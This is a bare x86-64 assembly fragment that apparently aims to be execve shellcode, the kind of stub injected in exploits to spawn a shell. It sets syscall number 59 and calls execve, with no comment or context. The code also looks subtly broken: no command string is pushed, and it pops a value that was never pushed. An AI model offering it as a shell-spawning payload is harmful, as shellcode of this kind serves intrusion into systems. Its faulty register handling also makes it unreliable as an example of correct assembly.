global _start
    _start:
        xor rax, rax
        push rax
        pop rsi
        cdq
        pop rdi
        mov rdi, rsp
        mov al, 59
        syscall
